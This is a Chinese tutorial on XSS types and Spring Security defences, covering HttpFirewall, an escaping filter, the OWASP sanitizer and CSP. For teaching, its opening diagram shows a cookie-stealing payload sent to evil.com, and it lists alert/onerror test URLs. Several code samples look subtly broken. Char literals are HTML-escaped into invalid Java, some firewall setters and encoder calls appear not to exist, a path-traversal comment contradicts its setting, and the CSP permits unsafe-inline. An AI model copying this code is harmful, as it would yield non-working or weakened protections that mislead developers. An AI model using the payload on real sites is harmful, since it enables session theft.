# XSS 防护：Filter 与 HttpFirewall

你有没有遇到过这种情况：用户在评论区输入了一段 JS 代码，结果所有人的页面都弹出了 alert？

这就是 XSS（跨站脚本攻击）的威力。

今天，我们就来深入了解 XSS 攻击的原理以及 Spring Security 是如何防护的。

---

## XSS 攻击原理

```
┌──────────────────────────────────────────────────────────────────────────┐
│                         XSS 攻击原理                                     │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  XSS（Cross-Site Scripting）：跨站脚本攻击                              │
│                                                                          │
│  核心思想：在网页中注入恶意 JavaScript 代码                             │
│                                                                          │
│  ────────────────────────────────────────────────────────────────────  │
│                                                                          │
│  攻击场景：评论区输入                                                   │
│                                                                          │
│  1. 用户在评论区输入：                                                  │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ &lt;script&gt;                                                       │   │
│  │   fetch('https://evil.com/steal?cookie=' + document.cookie);    │   │
│  │ &lt;/script&gt;                                                       │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  2. 提交后，评论内容存入数据库                                          │
│                                                                          │
│  3. 其他用户访问页面，评论被渲染                                        │
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ &lt;div&gt;                                                          │   │
│  │   &lt;script&gt;                                                    │   │
│  │     fetch('https://evil.com/steal?cookie=' + document.cookie);  │   │
│  │   &lt;/script&gt;                                                     │   │
│  │ &lt;/div&gt;                                                          │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  4. 恶意脚本执行，窃取用户 Cookie 或执行其他操作                         │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## XSS 的三种类型

### 1. 存储型 XSS

```
┌──────────────────────────────────────────────────────────────────────────┐
│                         存储型 XSS                                       │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  攻击流程：                                                            │
│                                                                          │
│  1. 攻击者将恶意代码提交到服务器                                       │
│  2. 服务器存储恶意代码（数据库）                                        │
│  3. 其他用户访问页面时，恶意代码被加载并执行                           │
│                                                                          │
│  危害：                                                                │
│  - 影响所有访问该页面的用户                                             │
│  - 持久生效，除非删除数据库中的恶意内容                                  │
│  - 可窃取所有访问用户的敏感信息                                         │
│                                                                          │
│  常见场景：评论区、论坛帖子、用户资料                                   │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 2. 反射型 XSS

```
┌──────────────────────────────────────────────────────────────────────────┐
│                         反射型 XSS                                       │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  攻击流程：                                                            │
│                                                                          │
│  1. 攻击者构造包含恶意代码的 URL                                        │
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ https://example.com/search?q=&lt;script&gt;alert('xss')&lt;/script&gt;     │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  2. 诱使受害者点击该 URL                                               │
│                                                                          │
│  3. 服务器将恶意代码作为搜索结果返回                                   │
│                                                                          │
│  4. 浏览器执行恶意代码                                                 │
│                                                                          │
│  特点：                                                                │
│  - 恶意代码不存储在服务器                                              │
│  - 需要诱导用户点击特定链接                                            │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### 3. DOM 型 XSS

```
┌──────────────────────────────────────────────────────────────────────────┐
│                         DOM 型 XSS                                       │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  攻击流程：                                                            │
│                                                                          │
│  1. 页面使用 JavaScript 从 URL 或 DOM 中获取数据                       │
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ const params = new URLSearchParams(location.search);            │   │
│  │ document.getElementById('name').innerHTML = params.get('name'); │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  2. 攻击者构造恶意 URL                                                 │
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │ https://example.com/page?name=&lt;img src=x onerror=alert(1)&gt;   │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  3. 恶意代码在前端执行，不经过服务器                                   │
│                                                                          │
│  特点：                                                                │
│  - 完全前端行为                                                        │
│  - 服务器日志可能看不到攻击痕迹                                         │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Spring Security 的 XSS 防护

### 1. HttpFirewall

Spring Security 通过 `HttpFirewall` 过滤非法请求：

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .anyRequest().authenticated()
            )
            .formLogin(Customizer.withDefaults());
        
        return http.build();
    }
    
    @Bean
    public HttpFirewall httpFirewall() {
        // 默认的 StrictHttpFirewall 提供基本的请求过滤
        StrictHttpFirewall firewall = new StrictHttpFirewall();
        
        // 配置允许的 HTTP 方法
        firewall.setAllowedHttpMethods(Arrays.asList("GET", "POST", "PUT", "DELETE"));
        
        // 配置允许的请求头
        firewall.setAllowedHeaderNames(Collections.singletonList("Authorization"));
        firewall.setAllowedHeaderValues(Collections.singletonList("*"));
        
        // 配置 URL 模式
        firewall.setAllowedUrlPatterns(Arrays.asList("/api/**"));
        
        return firewall;
    }
}
```

### 2. 请求路径验证

```java
@Bean
public HttpFirewall strictHttpFirewall() {
    StrictHttpFirewall firewall = new StrictHttpFirewall();
    
    // 防止路径遍历攻击
    firewall.setAllowUrlEncodedSlash(true);
    firewall.setAllowBackSlash(false);
    firewall.setAllowSemicolon(false);
    
    // 防止 URL 中的恶意模式
    firewall.setAllowUrlEncodedDoubleSlash(false);
    firewall.setAllowUrlEncodedPercent(false);
    
    return firewall;
}
```

---

## XSS 防护策略

### 1. 输入过滤

```java
@Component
public class XssFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                        FilterChain chain) throws IOException, ServletException {
        chain.doFilter(new XssHttpServletRequestWrapper((HttpServletRequest) request), response);
    }
}

// 请求包装器
public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {
    
    public XssHttpServletRequestWrapper(HttpServletRequest request) {
        super(request);
    }
    
    @Override
    public String getParameter(String name) {
        return xssEncode(super.getParameter(name));
    }
    
    @Override
    public String getHeader(String name) {
        return xssEncode(super.getHeader(name));
    }
    
    @Override
    public String[] getParameterValues(String name) {
        String[] values = super.getParameterValues(name);
        if (values == null) {
            return null;
        }
        return Arrays.stream(values)
            .map(this::xssEncode)
            .toArray(String[]::new);
    }
    
    /**
     * XSS 编码
     */
    private String xssEncode(String input) {
        if (input == null || input.isEmpty()) {
            return input;
        }
        
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < input.length(); i++) {
            char c = input.charAt(i);
            switch (c) {
                case '&lt;':
                    sb.append("&lt;");
                    break;
                case '&gt;':
                    sb.append("&gt;");
                    break;
                case '"':
                    sb.append("&quot;");
                    break;
                case '\'':
                    sb.append("&#x27;");
                    break;
                case '/':
                    sb.append("&#x2F;");
                    break;
                default:
                    sb.append(c);
            }
        }
        return sb.toString();
    }
}
```

### 2. HTML 转义

```java
@Component
public class HtmlEscapeUtil {
    
    // 使用 OWASP Java HTML Encoder
    private static final HtmlEncoder HTML_ENCODER = new HtmlEncoder();
    
    /**
     * HTML 转义
     */
    public static String escape(String input) {
        if (input == null) {
            return null;
        }
        return HTML_ENCODER.encode(input);
    }
    
    /**
     * JavaScript 转义
     */
    public static String escapeJavaScript(String input) {
        if (input == null) {
            return null;
        }
        return input
            .replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("'", "\\'")
            .replace("\n", "\\n")
            .replace("\r", "\\r");
    }
}
```

### 3. Spring MVC 输出转义

```html
&lt;!-- Thymeleaf 默认自动转义 --&gt;
&lt;div th:text="${comment.content}"&gt;&lt;/div&gt;

&lt;!-- 输出不转义的文本（谨慎使用）--&gt;
&lt;div th:utext="${comment.content}"&gt;&lt;/div&gt;

&lt;!-- 如果必须输出 HTML，考虑使用白名单 --&gt;
&lt;div th:inline="text" th:with="sanitizer=${T(org.owasp.html.PolicyFactory).newInstance()}"&gt;
    [[${sanitizer.sanitize(comment.content)}]]
&lt;/div&gt;
```

---

## OWASP Java HTML Sanitizer

### 添加依赖

```xml
&lt;dependency&gt;
    &lt;groupId&gt;com.googlecode.owasp-java-html-sanitizer&lt;/groupId&gt;
    &lt;artifactId&gt;owasp-java-html-sanitizer&lt;/artifactId&gt;
    &lt;version&gt;20220608.1&lt;/version&gt;
&lt;/dependency&gt;
```

### 使用示例

```java
@Component
public class HtmlSanitizer {
    
    private static final PolicyFactory POLICY_DEFINITION;
    
    static {
        POLICY_DEFINITION = new HtmlPolicyBuilder()
            .allowElements("a", "b", "i", "u", "em", "strong", "p", "br", "ul", "ol", "li", "h1", "h2", "h3")
            .allowAttributes("href").onElements("a")
            .requireRelNoFollowOnLinks()
            .allowUrlProtocols("http", "https", "mailto")
            .build();
    }
    
    /**
     * 清理 HTML，只保留安全的标签和属性
     */
    public String sanitize(String input) {
        if (input == null || input.isEmpty()) {
            return input;
        }
        return POLICY_DEFINITION.sanitize(input);
    }
}

@Service
public class CommentService {
    
    @Autowired
    private HtmlSanitizer htmlSanitizer;
    
    public Comment save(Comment comment) {
        // 保存前清理 HTML
        comment.setContent(htmlSanitizer.sanitize(comment.getContent()));
        return commentRepository.save(comment);
    }
}
```

---

## Spring Security 配置 XSS Filter

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Autowired
    private XssFilter xssFilter;
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .anyRequest().authenticated()
            )
            // 添加 XSS 过滤器
            .addFilterBefore(xssFilter, UsernamePasswordAuthenticationFilter.class)
            .formLogin(Customizer.withDefaults());
        
        return http.build();
    }
}
```

---

## 防御策略总结

```
┌──────────────────────────────────────────────────────────────────────────┐
│                         XSS 防御策略                                     │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. 输入过滤                                                            │
│     - 服务端验证输入合法性                                              │
│     - 使用白名单而非黑名单                                              │
│     - 过滤或转义危险字符                                               │
│                                                                          │
│  2. 输出转义                                                            │
│     - 在输出时转义，而非输入时                                          │
│     - 根据输出位置选择转义方式（HTML、JS、CSS、URL）                    │
│                                                                          │
│  3. 内容安全策略                                                        │
│     - 配置 CSP Header 限制脚本执行                                       │
│                                                                          │
│  4. HttpOnly 和 Secure Cookie                                          │
│     - 设置 HttpOnly 防止 JavaScript 访问 Cookie                         │
│     - 设置 Secure 只允许 HTTPS 传输 Cookie                              │
│                                                                          │
│  5. 使用现代框架                                                        │
│     - React、Vue 等框架默认转义                                         │
│     - Thymeleaf 默认自动转义                                           │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Content Security Policy (CSP)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self';" +
                        "script-src 'self' 'unsafe-inline';" +
                        "style-src 'self' 'unsafe-inline';" +
                        "img-src 'self' data:;" +
                        "font-src 'self';"
                    )
                )
                .frameOptions(frame -> frame.deny())
                .xssProtection(xss -> xss.disable())
            );
        
        return http.build();
    }
}
```

---

## 面试追问方向

| 问题 | 考察点 | 延伸阅读 |
|-----|--------|---------|
| XSS 有哪三种类型？ | 概念理解 | 本篇 |
| 存储型 XSS 和反射型 XSS 的区别？ | 原理理解 | 本篇 |
| 如何防护 XSS 攻击？ | 实战能力 | 本篇 |
| HttpOnly Cookie 有什么用？ | 安全机制 | 本篇 |
| 为什么输出转义比输入过滤更好？ | 设计理解 | 本篇 |

---

## 总结

XSS 防护的核心要点：

1. **三种类型**：存储型（最危险）、反射型、DOM 型
2. **防护策略**：输入过滤 + 输出转义
3. **HttpFirewall**：Spring Security 的请求过滤
4. **HTML Sanitizer**：使用白名单清理 HTML
5. **CSP**：内容安全策略，多一层防护

XSS 是 Web 安全中最常见的漏洞之一，防护需要系统性的设计。

---

## 下一步

- 想了解微服务安全？→ [Gateway 统一鉴权中心](/framework/springsecurity/gateway-auth)
- 想了解其他安全机制？→ [CSRF 防护机制](/framework/springsecurity/csrf)
- 想了解 CORS 配置？→ [CORS 跨域与 Security 配置](/framework/springsecurity/cors)
